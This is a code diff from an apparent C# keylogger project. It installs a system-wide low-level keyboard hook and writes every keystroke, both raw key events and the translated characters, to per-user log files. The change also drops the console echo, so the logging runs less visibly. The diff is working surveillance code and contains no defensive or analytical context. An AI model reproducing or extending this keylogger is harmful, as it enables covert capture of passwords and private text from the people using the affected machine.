@@ -17,8 +17,10 @@ namespace KeyboardLogger.KeyLog
         // data
         static IntPtr hHook = IntPtr.Zero;
         static LowLevelKeyboardProc kydbHookProc;
-        static Log userLog = new Log(Environment.UserName);
+        static string user = Environment.UserName;
         static Log headLog = new Log("head");
+        static Log keyLog = new Log(user + "-key");
+        static Log txtLog = new Log(user + "-txt");
 
         public static void Init()
         {
@@ -26,7 +28,11 @@ namespace KeyboardLogger.KeyLog
             ProcessModule module = Process.GetCurrentProcess().MainModule;
             IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
             hHook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, kydbHookProc, hMod, 0);
-            headLog.Write("["+Environment.UserName+"]").Flush();
+            headLog.Write("[" + user + "]");
+            headLog.Write(user + "-key");
+            headLog.Write(user + "-txt");
+            headLog.Flush();
+            KbdChar.Init();
         }
 
 
@@ -36,9 +42,9 @@ namespace KeyboardLogger.KeyLog
             if (code >= 0)
             {
                 Keys key = (Keys)lParam.vkCode;
-                string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP) ? key + "- " : key + " ";
-                Console.WriteLine(txt);
-                userLog.Write(txt);
+                bool active = (wParam == WM.KEYDOWN || wParam == WM.SYSKEYDOWN);
+                keyLog.Write(active ? key + "+ " : key + "- ");
+                txtLog.Write(KbdChar.Char(lParam.vkCode, active));
             }
             return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
